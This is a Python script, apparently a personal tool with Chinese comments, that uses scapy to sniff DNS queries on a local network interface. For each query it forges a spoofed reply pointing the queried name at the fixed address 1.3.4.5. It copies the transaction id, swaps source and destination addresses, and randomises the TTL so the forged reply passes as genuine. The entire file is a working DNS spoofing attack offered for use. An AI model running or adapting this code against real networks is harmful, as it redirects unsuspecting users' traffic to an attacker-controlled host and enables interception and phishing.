#coding:utf-8

'''
Date:2017-07-05
Author:飞鸟
Version:1.0
'''

from scapy.all import *
import random

'''
1、windows绑定本机网卡,首先使用show_interfaces()查看相关网卡
2、再使用conf.iface=''绑定相应的网卡
3、linux需要在sniff()中指定相应的网卡

'''
conf.iface = 'Intel(R) Ethernet Connection I219-V'

#conf.iface = 'Intel(R) Dual Band Wireless-AC 8260'

#DNS响应的地址，随机ip字段的id和ttl
rdata = "1.3.4.5"
ipid = random.randint(1,65535)
ipttl = random.randint(45,80)

def buying(mots):
	resp = Ether()/IP()/UDP()/DNS() 

	#构造DNS相关字段
	try:
		resp[DNS].qr = 1
		resp[DNS].rd = 1
		resp[DNS].qdcount = 1 
		resp[DNS].ancount = 1
		resp[DNS].id = mots[DNS].id
		resp[DNS].qd = mots[DNS].qd
		resp[DNS].an = DNSRR(type='A',rclass='IN',ttl=1800,rdata=rdata)
		resp[DNS].an.rrname = mots[DNS].qd.qname
	except Exception as e:
		pass

	#构造UDP相关字段
	resp[UDP].dport = mots[UDP].sport
	resp[UDP].sport = mots[UDP].dport

	#构造IP包头
	resp[IP].src = mots[IP].dst
	resp[IP].dst = mots[IP].src
	resp[IP].ttl = ipttl
	resp[IP].id  = ipid

	#构造以太网包头
	resp[Ether].src = mots[Ether].dst
	resp[Ether].dst = mots[Ether].src
	
	#发送构造的DNS响应包
	try:
		sendp(resp)
		print("DNS响应为:",mots[DNS].qd.qname,'->',rdata)
	except Exception as e:
		pass
	
if __name__ == '__main__':
	sniff(prn=buying,filter="udp dst port 53")
